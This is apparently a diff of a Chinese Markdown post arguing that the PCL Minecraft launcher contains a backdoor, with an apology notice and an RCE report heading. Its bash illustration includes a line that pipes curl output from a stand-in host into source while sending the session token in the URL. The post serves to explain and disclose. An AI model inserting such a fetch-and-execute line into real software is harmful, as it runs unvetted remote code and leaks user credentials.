@@ -1,4 +1,58 @@
-# Notice 公告
+1. [向龙腾猫跃的道歉公告](#my-apology)
+2. [PCL PoC 与研究报告](#report)
+
+# 重申为什么我的观点倾向于 PCL 有一个后门。
+
+鉴于所谓其他软件的撑腰“开团”，我想在这里作一些评论。
+
+我一直强调的“何谓后门”？答案是：即在用户**不预知**的情况下作出意料外的事情；且软件在用户未明确授权的情况下，从远程获取并执行可由别人控制的代码。
+
+用简单的 bash 来举例（你们最喜欢的 bash2shell 笑话：）一个简化 Minecraft 启动器的核心流程。
+
+我们简单定义一个 Shell 函数作为一个 Minecraft 启动器。
+
+```bash
+mc() {
+    local USERNAME="Steve" UUID="550e8400-e29b-41d4-a716-446655440000" TOKEN="114514" VERSION="1.21.1"
+    java -cp "minecraft.jar:libs/*" net.minecraft.client.main.Main --username "$USERNAME" --uuid "$UUID" --accessToken "$TOKEN" --userType msa --version "$VERSION" --gameDir . --assetsDir assets --assetIndex 17 "$@"
+}
+```
+
+这是我们预想的，对吧？用 Java 启动一个游戏。
+
+当然，我们也可以在游戏启动之前再加一个命令。并且作为接口开放。注意，这也是有些人最喜欢偷换概念，说“我们的软件也有 RCE 漏洞”，而这是用户可预知的。因为这是用户自己设定的，就算不是，也能看到到底输入了什么。
+
+```bash
+mc() {
+    local <省略>
+    local PRESTART="fcitx5-remote -c" # 作为接口开放的话，我们也知道做了什么。
+    eval "$PRESTART" && java <省略> "$@"
+}
+```
+
+那如果，我在前或后面加上一行呢？
+
+```bash
+mc() {
+    local TOKEN="114514" <省略>
+    local PRESTART="fcitx5-remote -c" 
+    source <(curl -fsSL "https://example.com/script?session=${TOKEN}") \ # 开源版本，这里写的是：“由于包含加解密等安全信息，本文件中的部分代码已被删除”
+    # ↑ 在这里，我们不得知做了什么。
+    # 即便他只是作为公告 Whatever. 但是他也有运行命令的能力。
+    # 而这是不预知的。
+    # 在现实情况下。如果把它藏起来，让大家看不到呢？
+    # 或者是，把代码给大家看。
+    # 只不过不告诉大家我们会这么做。
+        && eval "$PRESTART" \
+        && java <省略> "$@"
+}
+```
+
+不言而喻。
+
+我不求做什么 whistleblower，但是我们应该都知道，我们想要安心地运行一个程序。
+
+# <a id="my-apology" ></a> Notice 公告
 
 在这里先向龙腾猫跃道歉。
 
@@ -25,7 +79,7 @@
 2026-10-23
 
 
-# PCL2 `notice.json` 远程代码执行分析报告
+# <a id="report" ></a> PCL2 `notice.json` 远程代码执行分析报告
 
 2026-10-21
 
